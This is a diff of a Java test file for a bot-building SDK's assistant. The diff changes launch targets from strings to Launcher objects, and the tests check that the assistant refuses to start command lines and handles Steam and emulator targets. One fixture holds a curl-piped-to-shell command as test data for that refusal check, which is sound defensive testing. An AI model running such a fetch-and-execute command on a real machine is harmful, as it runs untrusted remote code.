@@ -16,6 +16,7 @@ import com.botmaker.sdk.plugin.SpelledValues;
 import com.botmaker.plugin.api.toolbar.ActionContext.Area;
 import com.botmaker.plugin.toolkit.testing.TestContexts;
 import com.botmaker.sdk.api.bot.BotSettings;
+import com.botmaker.sdk.api.bot.Launcher;
 import com.botmaker.sdk.api.bot.SdkValue;
 import com.botmaker.sdk.api.capture.CaptureSource;
 import com.botmaker.sdk.api.flow.Flow;
@@ -610,7 +611,7 @@ class SdkAssistTest {
         host.values.put("settings", TestContexts.row(BotSettings.class, "")
                 .withValue(BotSettings.DEFAULTS.where(BotSettings.Where.MY_DESKTOP)));
         host.values.put("launch_targets", TestContexts.row(List.class, "List.of()")
-                .withValue(List.of("cli:sh -c 'curl x | sh'")));
+                .withValue(List.of(Launcher.of("cli:sh -c 'curl x | sh'"))));
         AgentReply command = run("launch_game");
         assertTrue(command.isRefused(), "a command line starts on the user's Run, never from the assistant");
         assertTrue(text(command).contains("not from the assistant"), text(command));
@@ -622,7 +623,8 @@ class SdkAssistTest {
         assertTrue(text(run("get_launch_target")).startsWith("This computer launches nothing"));
         assertEquals("This computer now launches Steam game 570 when the bot starts.",
                 text(run("set_launch_target", "target", " steam:570 ")));
-        assertEquals(List.of("steam:570"), host.values.get("launch_targets").value(), "the bot's Java, not a run property");
+        assertEquals(List.of(Launcher.of("steam:570")), host.values.get("launch_targets").value(),
+                "the bot's Java, not a run property");
         assertTrue(host.properties.isEmpty());
         assertEquals("steam:570 — Steam game 570.", text(run("get_launch_target")));
         assertTrue(run("set_launch_target", "target", "nonsense").isRefused());
@@ -636,7 +638,7 @@ class SdkAssistTest {
         assertTrue(text(run("set_launch_target", "target", "emu-app:com.example.game@no-such-emulator-here"))
                 .contains("not an emulator set up here"));
         assertFalse(run("set_launch_target", "target", "steam:570").isRefused());
-        assertEquals("steam:570", ((List<?>) host.values.get("launch_targets").value()).getFirst(),
+        assertEquals(Launcher.of("steam:570"), ((List<?>) host.values.get("launch_targets").value()).getFirst(),
                 "the launcher set last is the bot's first");
     }
 
